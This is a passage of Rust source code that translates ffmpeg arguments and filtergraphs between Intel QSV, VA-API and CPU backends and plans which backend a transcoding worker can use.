                                                "unsupported scale_qsv option '{key}' for VA-API adaptation"
                                            ));
                                        }
                                    }
                                } else if idx == 0 {
                                    scale_args.push(format!("w={trimmed}"));
                                } else if idx == 1 {
                                    scale_args.push(format!("h={trimmed}"));
                                } else {
                                    return Err(format!(
                                        "unsupported positional scale_qsv argument '{trimmed}'"
                                    ));
                                }
                            }
                        }
                    }
                    let joined = scale_args.join(":");
                    let args_ref = if joined.is_empty() {
                        None
                    } else {
                        Some(joined.as_str())
                    };
                    out_nodes.push(format_filter_node(
                        node.leading_pads,
                        "scale_vaapi",
                        node.instance,
                        args_ref,
                        node.trailing_pads,
                    ));
                }
                "overlay_qsv" => {
                    let translated = translate_overlay_qsv_to_vaapi_args(node.args)?;
                    out_nodes.push(format_filter_node(
                        node.leading_pads,
                        "overlay_vaapi",
                        node.instance,
                        translated.as_deref(),
                        node.trailing_pads,
                    ));
                }
                "deinterlace_qsv" => {
                    let translated = translate_deinterlace_qsv_to_vaapi_args(node.args)?;
                    out_nodes.push(format_filter_node(
                        node.leading_pads,
                        "deinterlace_vaapi",
                        node.instance,
                        translated.as_deref(),
                        node.trailing_pads,
                    ));
                }
                "hwmap" | "hwupload" => {
                    if let Some(a) = node.args {
                        if let Some(rewritten) =
                            rewrite_hwmap_derive_device(a, "qsv", "vaapi", false)?
                        {
                            out_nodes.push(format_filter_node(
                                node.leading_pads,
                                node.name,
                                node.instance,
                                Some(&rewritten),
                                node.trailing_pads,
                            ));
                            continue;
                        }
                    }
                    out_nodes.push(node.raw.to_string());
                }
                "format" => {
                    if let Some(a) = node.args {
                        match rewrite_format_filter_args(a, FormatRewriteMode::QsvToVaapi) {
                            FormatRewriteOutcome::Rewritten(rewritten) => {
                                out_nodes.push(format_filter_node(
                                    node.leading_pads,
                                    node.name,
                                    node.instance,
                                    Some(&rewritten),
                                    node.trailing_pads,
                                ));
                                continue;
                            }
                            FormatRewriteOutcome::Unchanged | FormatRewriteOutcome::DropNode => {}
                        }
                    }
                    out_nodes.push(node.raw.to_string());
                }
                other if other.ends_with("_qsv") => {
                    return Err(format!(
                        "unsupported QSV filter '{}' for VA-API adaptation",
                        node.name
                    ));
                }
                _ => out_nodes.push(node.raw.to_string()),
            }
        }

        out_chains.push(out_nodes.join(","));
    }

    Ok(out_chains.join(";"))
}

fn translate_filtergraph_vaapi_to_qsv(graph: &str) -> Result<String, String> {
    let chains = split_unquoted(graph, b';');
    let mut out_chains = Vec::with_capacity(chains.len());

    for chain in chains {
        let raw_nodes = split_unquoted(chain, b',');
        let mut out_nodes = Vec::with_capacity(raw_nodes.len());

        for raw_node in raw_nodes {
            let Some(node) = parse_detailed_filter_node(raw_node) else {
                if !raw_node.trim().is_empty() {
                    out_nodes.push(raw_node.trim().to_string());
                }
                continue;
            };
            let lower = node.name.to_ascii_lowercase();

            match lower.as_str() {
                "scale_vaapi" => {
                    let mut scale_args = Vec::new();
                    if let Some(a) = node.args {
                        if !a.is_empty() {
                            for (idx, part) in split_filter_args(a).into_iter().enumerate() {
                                let trimmed = part.trim();
                                if trimmed.is_empty() {
                                    continue;
                                }
                                if let Some((k, v)) = trimmed.split_once('=') {
                                    let key = k.trim().to_ascii_lowercase();
                                    let val = v.trim();
                                    match key.as_str() {
                                        "w" | "width" => scale_args.push(format!("w={val}")),
                                        "h" | "height" => scale_args.push(format!("h={val}")),
                                        "format" => scale_args.push(format!("format={val}")),
                                        "extra_hw_frames" => {
                                            scale_args.push(format!("extra_hw_frames={val}"));
                                        }
                                        _ => {
                                            return Err(format!(
                                                "unsupported scale_vaapi option '{key}' for QSV adaptation"
                                            ));
                                        }
                                    }
                                } else if idx == 0 {
                                    scale_args.push(format!("w={trimmed}"));
                                } else if idx == 1 {
                                    scale_args.push(format!("h={trimmed}"));
                                } else {
                                    return Err(format!(
                                        "unsupported positional scale_vaapi argument '{trimmed}'"
                                    ));
                                }
                            }
                        }
                    }
                    let joined = scale_args.join(":");
                    let args_ref = if joined.is_empty() {
                        None
                    } else {
                        Some(joined.as_str())
                    };
                    out_nodes.push(format_filter_node(
                        node.leading_pads,
                        "scale_qsv",
                        node.instance,
                        args_ref,
                        node.trailing_pads,
                    ));
                }
                "deinterlace_vaapi" => {
                    let translated = translate_deinterlace_vaapi_to_qsv_args(node.args)?;
                    out_nodes.push(format_filter_node(
                        node.leading_pads,
                        "deinterlace_qsv",
                        node.instance,
                        translated.as_deref(),
                        node.trailing_pads,
                    ));
                }
                "hwmap" | "hwupload" => {
                    if let Some(a) = node.args {
                        if let Some(rewritten) =
                            rewrite_hwmap_derive_device(a, "vaapi", "qsv", true)?
                        {
                            out_nodes.push(format_filter_node(
                                node.leading_pads,
                                node.name,
                                node.instance,
                                Some(&rewritten),
                                node.trailing_pads,
                            ));
                            continue;
                        }
                    }
                    out_nodes.push(node.raw.to_string());
                }
                "format" => {
                    if let Some(a) = node.args {
                        match rewrite_format_filter_args(a, FormatRewriteMode::VaapiToQsv) {
                            FormatRewriteOutcome::Rewritten(rewritten) => {
                                out_nodes.push(format_filter_node(
                                    node.leading_pads,
                                    node.name,
                                    node.instance,
                                    Some(&rewritten),
                                    node.trailing_pads,
                                ));
                                continue;
                            }
                            FormatRewriteOutcome::Unchanged | FormatRewriteOutcome::DropNode => {}
                        }
                    }
                    out_nodes.push(node.raw.to_string());
                }
                "tonemap_vaapi" | "libplacebo" => {
                    return Err(format!(
                        "cannot adapt filter '{}' from VA-API to QSV",
                        node.name
                    ));
                }
                other
                    if other.ends_with("_vaapi")
                        || other.ends_with("_opencl")
                        || other.ends_with("_vulkan")
                        || other.ends_with("_cuda")
                        || other.ends_with("_cuvid")
                        || other.ends_with("_npp") =>
                {
                    return Err(format!(
                        "unsupported filter '{}' for VA-API to QSV adaptation",
                        node.name
                    ));
                }
                _ => out_nodes.push(node.raw.to_string()),
            }
        }

        out_chains.push(out_nodes.join(","));
    }

    Ok(out_chains.join(";"))
}

fn translate_filtergraph_hw_to_cpu(graph: &str) -> Result<String, String> {
    let chains = split_unquoted(graph, b';');
    let mut out_chains = Vec::with_capacity(chains.len());

    for chain in chains {
        let raw_nodes = split_unquoted(chain, b',');
        let mut out_nodes: Vec<String> = Vec::with_capacity(raw_nodes.len());
        let mut pending_leading = String::new();
        let mut pending_trailing = String::new();
        let mut stripped_hw_format = false;
        let mut has_cpu_format = false;

        let push_node = |out_nodes: &mut Vec<String>,
                         pending_leading: &mut String,
                         pending_trailing: &mut String,
                         leading: &str,
                         body: &str,
                         trailing: &str| {
            let mut full = String::new();
            if !pending_leading.is_empty() {
                full.push_str(pending_leading);
                pending_leading.clear();
            }
            full.push_str(leading);
            full.push_str(body);
            full.push_str(trailing);
            if !pending_trailing.is_empty() {
                full.push_str(pending_trailing);
                pending_trailing.clear();
            }
            out_nodes.push(full);
        };

        for raw_node in raw_nodes {
            let Some(node) = parse_detailed_filter_node(raw_node) else {
                continue;
            };
            let lower = node.name.to_ascii_lowercase();

            match lower.as_str() {
                "tonemap_opencl" | "tonemap_vaapi" | "libplacebo" | "overlay_vaapi"
                | "overlay_qsv" | "overlay_cuda" | "overlay_opencl" => {
                    return Err(format!(
                        "cannot adapt GPU-only filter '{}' to CPU",
                        node.name
                    ));
                }
                "hwupload" | "hwupload_cuda" | "hwdownload" | "hwmap" => {
                    stripped_hw_format = true;
                    if !node.leading_pads.is_empty() {
                        pending_leading.push_str(node.leading_pads);
                    }
                    if !node.trailing_pads.is_empty() {
                        if let Some(last) = out_nodes.last_mut() {
                            last.push_str(node.trailing_pads);
                        } else {
                            pending_trailing.push_str(node.trailing_pads);
                        }
                    }
                }
                "scale_vaapi" | "scale_qsv" | "vpp_qsv" | "scale_cuda" => {
                    let mut scale_args = Vec::new();
                    let mut saw_format = false;
                    let mut fps_val: Option<String> = None;

                    if let Some(a) = node.args {
                        if !a.is_empty() {
                            for (idx, part) in split_filter_args(a).into_iter().enumerate() {
                                let trimmed = part.trim();
                                if trimmed.is_empty() {
                                    continue;
                                }
                                if let Some((k, v)) = trimmed.split_once('=') {
                                    let key = k.trim().to_ascii_lowercase();
                                    let val = v.trim();
                                    match key.as_str() {
                                        "w" | "width" => scale_args.push(format!("w={val}")),
                                        "h" | "height" => scale_args.push(format!("h={val}")),
                                        "format" => {
                                            if !val.eq_ignore_ascii_case("same") {
                                                saw_format = true;
                                            }
                                        }
                                        "force_original_aspect_ratio" | "force_divisible_by" => {
                                            scale_args.push(format!("{key}={val}"));
                                        }
                                        "framerate" if lower == "vpp_qsv" => {
                                            fps_val = Some(val.to_string());
                                        }
                                        "extra_hw_frames" | "async_depth" | "mode"
                                        | "scale_mode" | "reset_sar" => {}
                                        _ if lower == "vpp_qsv" => {
                                            return Err(format!(
                                                "unsupported vpp_qsv option '{key}' for CPU adaptation"
                                            ));
                                        }
                                        _ => {}
                                    }
                                } else if lower != "vpp_qsv" && idx == 0 {
                                    scale_args.push(format!("w={trimmed}"));
                                } else if lower != "vpp_qsv" && idx == 1 {
                                    scale_args.push(format!("h={trimmed}"));
                                } else if lower == "vpp_qsv" {
                                    return Err(format!(
                                        "unsupported positional vpp_qsv argument '{trimmed}'"
                                    ));
                                }
                            }
                        }
                    }

                    let mut generated: Vec<String> = Vec::new();
                    if !scale_args.is_empty() {
                        generated.push(format!("scale={}", scale_args.join(":")));
                    }
                    if let Some(fps) = fps_val {
                        generated.push(format!("fps={fps}"));
                    }
                    if saw_format {
                        generated.push("format=yuv420p".to_string());
                        has_cpu_format = true;
                    }
                    if generated.is_empty() {
                        stripped_hw_format = true;
                        if !node.leading_pads.is_empty() {
                            pending_leading.push_str(node.leading_pads);
                        }
                        if !node.trailing_pads.is_empty() {
                            if let Some(last) = out_nodes.last_mut() {
                                last.push_str(node.trailing_pads);
                            } else {
                                pending_trailing.push_str(node.trailing_pads);
                            }
                        }
                    } else {
                        let last_idx = generated.len() - 1;
                        for (g_idx, body) in generated.into_iter().enumerate() {
                            let lead = if g_idx == 0 { node.leading_pads } else { "" };
                            let trail = if g_idx == last_idx {
                                node.trailing_pads
                            } else {
                                ""
                            };
                            push_node(
                                &mut out_nodes,
                                &mut pending_leading,
                                &mut pending_trailing,
                                lead,
                                &body,
                                trail,
                            );
                        }
                    }
                }
                "format" => {
                    if let Some(a) = node.args {
                        match rewrite_format_filter_args(a, FormatRewriteMode::StripHw) {
                            FormatRewriteOutcome::DropNode => {
                                stripped_hw_format = true;
                                if !node.leading_pads.is_empty() {
                                    pending_leading.push_str(node.leading_pads);
                                }
                                if !node.trailing_pads.is_empty() {
                                    if let Some(last) = out_nodes.last_mut() {
                                        last.push_str(node.trailing_pads);
                                    } else {
                                        pending_trailing.push_str(node.trailing_pads);
                                    }
                                }
                            }
                            FormatRewriteOutcome::Rewritten(rewritten) => {
                                stripped_hw_format = true;
                                has_cpu_format = true;
                                let body = format_filter_node(
                                    "",
                                    node.name,
                                    node.instance,
                                    Some(&rewritten),
                                    "",
                                );
                                push_node(
                                    &mut out_nodes,
                                    &mut pending_leading,
                                    &mut pending_trailing,
                                    node.leading_pads,
                                    &body,
                                    node.trailing_pads,
                                );
                            }
                            FormatRewriteOutcome::Unchanged => {
                                has_cpu_format = true;
                                let body =
                                    format_filter_node("", node.name, node.instance, node.args, "");
                                push_node(
                                    &mut out_nodes,
                                    &mut pending_leading,
                                    &mut pending_trailing,
                                    node.leading_pads,
                                    &body,
                                    node.trailing_pads,
                                );
                            }
                        }
                    } else {
                        out_nodes.push(node.raw.to_string());
                    }
                }
                other
                    if other.ends_with("_vaapi")
                        || other.ends_with("_qsv")
                        || other.ends_with("_cuda")
                        || other.ends_with("_cuvid")
                        || other.ends_with("_opencl")
                        || other.ends_with("_vulkan")
                        || other.ends_with("_npp") =>
                {
                    return Err(format!(
                        "cannot adapt hardware filter '{}' to CPU",
                        node.name
                    ));
                }
                _ => {
                    let body = format_filter_node("", node.name, node.instance, node.args, "");
                    push_node(
                        &mut out_nodes,
                        &mut pending_leading,
                        &mut pending_trailing,
                        node.leading_pads,
                        &body,
                        node.trailing_pads,
                    );
                }
            }
        }

        if stripped_hw_format && !has_cpu_format {
            push_node(
                &mut out_nodes,
                &mut pending_leading,
                &mut pending_trailing,
                "",
                "format=yuv420p",
                "",
            );
        } else if !pending_trailing.is_empty() {
            if let Some(last) = out_nodes.last_mut() {
                last.push_str(&pending_trailing);
            }
        }

        if !out_nodes.is_empty() {
            out_chains.push(out_nodes.join(","));
        }
    }

    Ok(out_chains.join(";"))
}

fn is_qsv_only_flag_to_strip(flag: &str) -> bool {
    flag == "-preset"
        || flag.starts_with("-preset:")
        || matches!(
            flag,
            "-look_ahead"
                | "-look_ahead_depth"
                | "-async_depth"
                | "-low_power"
                | "-extbrc"
                | "-mbbrc"
                | "-b_strategy"
                | "-adaptive_i"
                | "-adaptive_b"
        )
}

fn is_cpu_stripped_hw_flag(flag: &str) -> bool {
    is_hwaccel_flag(flag)
        || is_hwaccel_device_flag(flag)
        || is_hwaccel_output_format_flag(flag)
        || flag.starts_with("-hwaccel_")
        || flag.starts_with("-global_quality:")
        || flag.starts_with("-qp:")
        || matches!(
            flag,
            "-init_hw_device"
                | "-filter_hw_device"
                | "-vaapi_device"
                | "-qsv_device"
                | "-extra_hw_frames"
                | "-rc_mode"
                | "-low_power"
                | "-async_depth"
                | "-look_ahead"
                | "-look_ahead_depth"
                | "-global_quality"
                | "-compression_level"
                | "-qp"
                | "-b_strategy"
                | "-extbrc"
                | "-mbbrc"
                | "-adaptive_i"
                | "-adaptive_b"
                | "-rc"
                | "-spatial-aq"
                | "-temporal-aq"
                | "-b_ref_mode"
                | "-cq"
        )
}

fn is_valid_x264_preset(val: &str) -> bool {
    matches!(
        val.trim().to_ascii_lowercase().as_str(),
        "ultrafast"
            | "superfast"
            | "veryfast"
            | "faster"
            | "fast"
            | "medium"
            | "slow"
            | "slower"
            | "veryslow"
            | "placebo"
    )
}

fn can_adapt_qsv_to_vaapi<S: AsRef<str>>(args: &[S], cap: &Capability) -> bool {
    let is_qsv = cap.hwaccel == Some(HwAccel::Qsv) || cap.required_hwaccels.contains(&HwAccel::Qsv);
    if !is_qsv || cap.required_hwaccels.contains(&HwAccel::Cuda) {
        return false;
    }
    if let Some(enc) = cap.required_encoder() {
        let lower = enc.to_ascii_lowercase();
        if lower.ends_with("_qsv") && qsv_to_vaapi_encoder(&lower).is_none() {
            return false;
        }
        if lower.ends_with("_nvenc") {
            return false;
        }
    }
    adapt_args_for_backend(
        args,
        AdaptedTargetBackend::Vaapi,
        Some("/dev/dri/renderD128"),
    )
    .is_ok()
}

fn can_adapt_vaapi_to_qsv<S: AsRef<str>>(args: &[S], cap: &Capability) -> bool {
    if cap.hwaccel != Some(HwAccel::Vaapi) || cap.requires_vaapi_tonemap {
        return false;
    }
    if cap.required_hwaccels.iter().any(|hw| {
        matches!(
            hw,
            HwAccel::OpenCl | HwAccel::Vulkan | HwAccel::Cuda | HwAccel::Qsv
        )
    }) {
        return false;
    }
    let Some(enc) = cap.required_encoder() else {
        return false;
    };
    if vaapi_to_qsv_encoder(enc).is_none() {
        return false;
    }
    adapt_args_for_backend(args, AdaptedTargetBackend::Qsv, Some("/dev/dri/renderD128")).is_ok()
}

fn can_adapt_hw_to_cpu<S: AsRef<str>>(args: &[S], cap: &Capability) -> bool {
    if !cap.requires_hardware() {
        return false;
    }
    let Some(enc) = cap.required_encoder() else {
        return false;
    };
    if hw_to_cpu_encoder(enc).is_none() {
        return false;
    }
    adapt_args_for_backend(args, AdaptedTargetBackend::Cpu, None).is_ok()
}

fn encoder_in_list(enc: &str, worker_encoders: &[String]) -> bool {
    worker_encoders.iter().any(|e| e.eq_ignore_ascii_case(enc))
}

fn hw_decoder_supported_on_worker(cap: &Capability, worker_hw_decoders: &[String]) -> bool {
    if worker_hw_decoders.is_empty() {
        return true;
    }
    match cap.required_hw_decoder() {
        Some(req_dec) => worker_hw_decoders
            .iter()
            .any(|d| d.eq_ignore_ascii_case(req_dec)),
        None => true,
    }
}

fn worker_has_intel_node(nodes: &[af_hardware::RenderNode]) -> bool {
    nodes.iter().any(|n| {
        n.vendor_id
            .as_deref()
            .is_some_and(|v| v.trim().eq_ignore_ascii_case(PCI_VENDOR_INTEL))
    })
}

fn worker_has_vaapi_node(nodes: &[af_hardware::RenderNode], requires_vaapi_tonemap: bool) -> bool {
    nodes.iter().any(|n| {
        let vendor = n
            .vendor_id
            .as_deref()
            .map(|v| v.trim().to_ascii_lowercase())
            .filter(|v| !v.is_empty());
        match vendor.as_deref() {
            Some(PCI_VENDOR_INTEL) | None => true,
            Some(PCI_VENDOR_AMD) => !requires_vaapi_tonemap,
            _ => false,
        }
    })
}

/// Plans whether a worker with `mode`, `worker_encoders`, `worker_hw_decoders`, and `worker_nodes`
/// can execute `args` natively or by adapting to another backend (`Vaapi`, `Qsv`, or `Cpu`).
pub fn plan_backend_adaptation<S: AsRef<str>>(
    args: &[S],
    cap: &Capability,
    mode: BackendAdaptMode,
    worker_encoders: &[String],
    worker_hw_decoders: &[String],
    worker_nodes: &[af_hardware::RenderNode],
) -> Option<AdaptedTargetBackend> {
    let native_encoder_ok = cap
        .required_encoder()
        .is_none_or(|enc| encoder_in_list(enc, worker_encoders));
    let native_node_ok = if cap.requires_hardware() {
        select_render_node(cap, worker_nodes).is_some()
    } else {
        true
    };
    let native_decoder_ok = hw_decoder_supported_on_worker(cap, worker_hw_decoders);
    let native_ok = native_encoder_ok && native_node_ok && native_decoder_ok;

    if mode == BackendAdaptMode::PreferQsv
        && cap.hwaccel == Some(HwAccel::Vaapi)
        && can_adapt_vaapi_to_qsv(args, cap)
        && worker_has_intel_node(worker_nodes)
        && cap
            .required_encoder()
            .and_then(vaapi_to_qsv_encoder)
            .is_some_and(|enc| encoder_in_list(enc, worker_encoders))
        && hw_decoder_supported_on_worker(cap, worker_hw_decoders)
    {
        return Some(AdaptedTargetBackend::Qsv);
    }

    if native_ok {
        return Some(AdaptedTargetBackend::Native);
    }

    if matches!(
        mode,
        BackendAdaptMode::Gpu | BackendAdaptMode::PreferQsv | BackendAdaptMode::All
    ) {
        if can_adapt_qsv_to_vaapi(args, cap)
            && worker_has_vaapi_node(worker_nodes, cap.requires_vaapi_tonemap)
            && hw_decoder_supported_on_worker(cap, worker_hw_decoders)
        {
            let target_enc_ok = match cap.required_encoder() {
                Some(enc) => {
                    let mapped = qsv_to_vaapi_encoder(enc).unwrap_or(enc);
                    encoder_in_list(mapped, worker_encoders)
                }
                None => true,
            };
            if target_enc_ok {
                return Some(AdaptedTargetBackend::Vaapi);
            }
        }

        if can_adapt_vaapi_to_qsv(args, cap)
            && worker_has_intel_node(worker_nodes)
            && cap
                .required_encoder()
                .and_then(vaapi_to_qsv_encoder)
                .is_some_and(|enc| encoder_in_list(enc, worker_encoders))
            && hw_decoder_supported_on_worker(cap, worker_hw_decoders)
        {
            return Some(AdaptedTargetBackend::Qsv);
        }
    }

    if mode == BackendAdaptMode::All
        && can_adapt_hw_to_cpu(args, cap)
        && cap
            .required_encoder()
            .and_then(hw_to_cpu_encoder)
            .is_some_and(|enc| encoder_in_list(enc, worker_encoders))
    {
        return Some(AdaptedTargetBackend::Cpu);
    }

    None
}

/// Rewrites `ffmpeg` arguments to target `target` (`Native`, `Vaapi`, `Qsv`, or `Cpu`),
/// strictly respecting CLI token boundaries, `--`, input vs output sections, and quoted/escaped
/// filtergraphs so media paths, subtitle paths, and metadata values are never corrupted.
pub fn adapt_args_for_backend<S: AsRef<str>>(
    args: &[S],
    target: AdaptedTargetBackend,
    render_node: Option<&str>,
) -> Result<Vec<String>, String> {
    match target {
        AdaptedTargetBackend::Native => Ok(args.iter().map(|s| s.as_ref().to_string()).collect()),
        AdaptedTargetBackend::Vaapi => adapt_qsv_to_vaapi(args, render_node),
        AdaptedTargetBackend::Qsv => adapt_vaapi_to_qsv(args, render_node),
        AdaptedTargetBackend::Cpu => adapt_hw_to_cpu(args),
    }
}

fn rewrite_other_init_hw_device_for_vaapi(
    spec: &str,
    render_node: Option<&str>,
    qsv_dev_names: &[String],
    vaapi_dev_name: &str,
) -> String {
    let (main_part, opts_tail) = match spec.find(',') {
        Some(comma_idx) => (&spec[..comma_idx], &spec[comma_idx..]),
        None => (spec, ""),
    };

    let derived_at = match (main_part.find('@'), main_part.find(':')) {
        (Some(at_idx), None) => Some(at_idx),
        (Some(at_idx), Some(colon_idx)) if at_idx < colon_idx => Some(at_idx),
        _ => None,
    };

    if let Some(at_idx) = derived_at {
        let before_at = &main_part[..at_idx];
        let source_name = &main_part[at_idx + 1..];
        if qsv_dev_names.iter().any(|q| q == source_name) || source_name.eq_ignore_ascii_case("qsv")
        {
            return format!("{before_at}@{vaapi_dev_name}{opts_tail}");
        }
        return spec.to_string();
    }

    if let Some(node) = render_node {
        rewrite_init_hw_device_spec(spec, None, node)
    } else {
        spec.to_string()
    }
}

fn adapt_qsv_to_vaapi<S: AsRef<str>>(
    args: &[S],
    render_node: Option<&str>,
) -> Result<Vec<String>, String> {
    let (_, last_input_idx) = find_first_and_last_input_idx(args);

    let mut has_vaapi_init = false;
    let mut has_vaapi_device = false;
    let mut vaapi_dev_name = "va".to_string();
    let mut qsv_dev_names: Vec<String> = Vec::new();
    let mut references_qsv_device_alias = false;
    let mut fallback_qsv_node: Option<String> = None;

    {
        let mut i = 0usize;
        while i < args.len() {
            let arg = args[i].as_ref();
            if arg == "--" {
                break;
            }
            let next = args.get(i + 1).map(AsRef::as_ref);
            if arg == "-init_hw_device" {
                if let Some(spec) = next {
                    let (hw, dev) = parse_init_hw_device(spec);
                    match hw {
                        Some(HwAccel::Vaapi) => {
                            has_vaapi_init = true;
                            if let Some(name) = parse_init_hw_device_name(spec) {
                                vaapi_dev_name = name.to_string();
                            }
                        }
                        Some(HwAccel::Qsv) => {
                            if let Some(name) = parse_init_hw_device_name(spec) {
                                push_unique(&mut qsv_dev_names, name.to_string());
                            }
                            if fallback_qsv_node.is_none() {
                                if let Some(d) = dev.filter(|d| is_valid_render_node_path(d)) {
                                    fallback_qsv_node = Some(d.to_string());
                                }
                            }
                        }
                        _ => {}
                    }
                    i += 2;
                    continue;
                }
            } else if arg == "-qsv_device" {
                if let Some(val) = next {
                    if fallback_qsv_node.is_none() && is_valid_render_node_path(val) {
                        fallback_qsv_node = Some(val.to_string());
                    }
                    i += 2;
                    continue;
                }
            } else if arg == "-vaapi_device" {
                has_vaapi_device = true;
                i += 2;
                continue;
            } else if arg == "-filter_hw_device" || is_hwaccel_device_flag(arg) {
                if let Some(val) = next {
                    if val.eq_ignore_ascii_case("qsv") {
                        references_qsv_device_alias = true;
                    }
                    i += 2;
                    continue;
                }
            } else if option_takes_value(arg) {
                i += 2;
                continue;
            }
            i += 1;
        }
    }

    let ensure_vaapi_name = if !qsv_dev_names.is_empty() || references_qsv_device_alias {
        Some(vaapi_dev_name.as_str())
    } else {
        None
    };

    let target_node = render_node
        .or(fallback_qsv_node.as_deref())
        .unwrap_or("/dev/dri/renderD128");
    let mut emitted_vaapi_init = has_vaapi_init;
    let mut out = Vec::with_capacity(args.len() + 2);
    let mut i = 0usize;
    let mut after_double_dash = false;

    while i < args.len() {
        let arg = args[i].as_ref();
        if after_double_dash {
            out.push(arg.to_string());
            i += 1;
            continue;
        }
        if arg == "--" {
            after_double_dash = true;
            out.push(arg.to_string());
            i += 1;
            continue;
        }
        let next = args.get(i + 1).map(AsRef::as_ref);

        if arg == "-init_hw_device" {
            if let Some(spec) = next {
                let (hw, _) = parse_init_hw_device(spec);
                match hw {
                    Some(HwAccel::Vaapi) => {
                        out.push(arg.to_string());
                        out.push(format_vaapi_init_spec(
                            spec,
                            render_node,
                            true,
                            ensure_vaapi_name,
                        ));
                    }
                    Some(HwAccel::Qsv) => {
                        if !emitted_vaapi_init {
                            out.push("-init_hw_device".to_string());
                            out.push(format!("vaapi={vaapi_dev_name}:{target_node}"));
                            emitted_vaapi_init = true;
                        }
                    }
                    _ => {
                        out.push(arg.to_string());
                        out.push(rewrite_other_init_hw_device_for_vaapi(
                            spec,
                            render_node,
                            &qsv_dev_names,
                            &vaapi_dev_name,
                        ));
                    }
                }
                i += 2;
                continue;
            }
        } else if arg == "-qsv_device" {
            if next.is_some() {
                if !emitted_vaapi_init {
                    out.push("-init_hw_device".to_string());
                    out.push(format!("vaapi={vaapi_dev_name}:{target_node}"));
                    emitted_vaapi_init = true;
                }
                i += 2;
                continue;
            }
        } else if arg == "-vaapi_device" {
            if let Some(val) = next {
                out.push(arg.to_string());
                if let Some(node) = render_node.filter(|_| is_valid_render_node_path(val)) {
                    out.push(node.to_string());
                } else {
                    out.push(val.to_string());
                }
                i += 2;
                continue;
            }
        } else if arg == "-filter_hw_device" {
            if let Some(val) = next {
                out.push(arg.to_string());
                if qsv_dev_names.iter().any(|q| q == val) || val.eq_ignore_ascii_case("qsv") {
                    out.push(vaapi_dev_name.clone());
                } else {
                    out.push(val.to_string());
                }
                i += 2;
                continue;
            }
        } else if is_hwaccel_flag(arg) || is_hwaccel_output_format_flag(arg) {
            if let Some(val) = next {
                out.push(arg.to_string());
                if val.eq_ignore_ascii_case("qsv") {
                    out.push("vaapi".to_string());
                } else {
                    out.push(val.to_string());
                }
                i += 2;
                continue;
            }
        } else if is_hwaccel_device_flag(arg) {
            if let Some(val) = next {
                out.push(arg.to_string());
                if qsv_dev_names.iter().any(|q| q == val) || val.eq_ignore_ascii_case("qsv") {
                    out.push(vaapi_dev_name.clone());
                } else if let Some(node) = render_node.filter(|_| is_valid_render_node_path(val)) {
                    out.push(node.to_string());
                } else {
                    out.push(val.to_string());
                }
                i += 2;
                continue;
            }
        } else if is_video_codec_flag(arg) {
            if let Some(val) = next {
                let is_output = last_input_idx.is_none_or(|pos| i > pos + 1);
                let lower = val.trim().to_ascii_lowercase();
                if is_output {
                    if lower.ends_with("_qsv") {
                        let mapped = qsv_to_vaapi_encoder(&lower).ok_or_else(|| {
                            format!("unsupported QSV encoder '{val}' for VA-API adaptation")
                        })?;
                        out.push(arg.to_string());
                        out.push(mapped.to_string());
                    } else {
                        out.push(arg.to_string());
                        out.push(val.to_string());
                    }
                } else if lower.ends_with("_qsv") {
                    let base = hw_decoder_to_base_codec(&lower).ok_or_else(|| {
                        format!("unsupported QSV decoder '{val}' for VA-API adaptation")
                    })?;
                    out.push(arg.to_string());
                    out.push(base.to_string());
                } else {
                    out.push(arg.to_string());
                    out.push(val.to_string());
                }
                i += 2;
                continue;
            }
        } else if is_qsv_only_flag_to_strip(arg) {
            if next.is_some() {
                i += 2;
                continue;
            }
        } else if arg == "-global_quality" || arg.starts_with("-global_quality:") {
            if let Some(val) = next {
                let rewritten_flag = if let Some(suffix) = arg.strip_prefix("-global_quality") {
                    format!("-qp{suffix}")
                } else {
                    "-qp".to_string()
                };
                out.push(rewritten_flag);
                out.push(val.to_string());
                i += 2;
                continue;
            }
        } else if is_video_filter_flag(arg) {
            if let Some(val) = next {
                let translated = translate_filtergraph_qsv_to_vaapi(val)?;
                out.push(arg.to_string());
                out.push(translated);
                i += 2;
                continue;
            }
        } else if option_takes_value(arg) {
            out.push(arg.to_string());
            if let Some(val) = next {
                out.push(val.to_string());
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }

        out.push(arg.to_string());
        i += 1;
    }

    if !emitted_vaapi_init && !has_vaapi_device {
        if let Some(node) = render_node {
            let mut prefixed = Vec::with_capacity(out.len() + 2);
            prefixed.push("-init_hw_device".to_string());
            prefixed.push(format!("vaapi={vaapi_dev_name}:{node}"));
            prefixed.extend(out);
            return Ok(prefixed);
        }
    }

    Ok(out)
}

fn adapt_vaapi_to_qsv<S: AsRef<str>>(
    args: &[S],
    render_node: Option<&str>,
) -> Result<Vec<String>, String> {
    let (_, last_input_idx) = find_first_and_last_input_idx(args);

    let mut vaapi_dev_name = "va".to_string();
    let mut fallback_vaapi_node: Option<String> = None;
    let mut has_filter_hw_device = false;
    let mut saw_supported_vaapi_encoder = false;

    {
        let mut i = 0usize;
        while i < args.len() {
            let arg = args[i].as_ref();
            if arg == "--" {
                break;
            }
            let next = args.get(i + 1).map(AsRef::as_ref);
            if arg == "-init_hw_device" {
                if let Some(spec) = next {
                    let (hw, dev) = parse_init_hw_device(spec);
                    match hw {
                        Some(HwAccel::Vaapi) => {
                            if let Some(name) = parse_init_hw_device_name(spec) {
                                vaapi_dev_name = name.to_string();
                            }
                            if fallback_vaapi_node.is_none() {
                                if let Some(d) = dev.filter(|d| is_valid_render_node_path(d)) {
                                    fallback_vaapi_node = Some(d.to_string());
                                }
                            }
                        }
                        Some(HwAccel::OpenCl | HwAccel::Vulkan | HwAccel::Cuda) => {
                            return Err(format!(
                                "cannot adapt mixed {} pipeline from VA-API to QSV",
                                hw.unwrap().as_str()
                            ));
                        }
                        _ => {}
                    }
                    i += 2;
                    continue;
                }
            } else if arg == "-vaapi_device" {
                if let Some(val) = next {
                    if fallback_vaapi_node.is_none() && is_valid_render_node_path(val) {
                        fallback_vaapi_node = Some(val.to_string());
                    }
                    i += 2;
                    continue;
                }
            } else if arg == "-filter_hw_device" {
                has_filter_hw_device = true;
                i += 2;
                continue;
            } else if is_video_codec_flag(arg) {
                if let Some(val) = next {
                    let is_output = last_input_idx.is_none_or(|pos| i > pos + 1);
                    if is_output {
                        if vaapi_to_qsv_encoder(val).is_some() {
                            saw_supported_vaapi_encoder = true;
                        } else if val.to_ascii_lowercase().ends_with("_vaapi") {
                            return Err(format!(
                                "unsupported VA-API encoder '{val}' for QSV adaptation"
                            ));
                        }
                    }
                    i += 2;
                    continue;
                }
            } else if option_takes_value(arg) {
                i += 2;
                continue;
            }
            i += 1;
        }
    }

    if !saw_supported_vaapi_encoder {
        return Err(
